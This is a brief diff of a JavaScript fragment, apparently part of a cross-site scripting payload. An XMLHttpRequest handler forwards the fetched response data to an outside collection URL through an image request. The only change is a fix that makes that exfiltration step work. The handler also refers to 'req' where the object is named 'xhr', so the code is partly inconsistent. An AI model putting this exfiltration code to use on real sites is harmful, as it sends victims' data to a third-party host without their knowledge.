@@ -6,7 +6,7 @@ xhr.onreadystatechange = function() {
   if (req.readyState == 4)
     if (req.status == 200) {
         var data = xhr.response;
-        Image().src = "http://requestbin.fullcontact.com/10tmuur1?data=" + data;
+        new Image().src = "http://requestbin.fullcontact.com/10tmuur1?data=" + data;
     }
 };
 
